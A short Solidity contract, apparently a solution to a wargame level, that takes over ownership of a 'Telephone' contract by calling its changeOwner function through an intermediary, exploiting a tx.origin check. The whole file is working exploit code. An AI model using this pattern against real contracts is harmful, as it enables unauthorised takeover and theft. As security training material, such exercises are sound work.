// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './telephone.sol';

contract TelephoneHack {

  Telephone telContract;

  constructor(address _address) public {
    telContract = Telephone(_address);
  }

  function hackContract(address _address) public {
    telContract.changeOwner(_address);
  }
  
}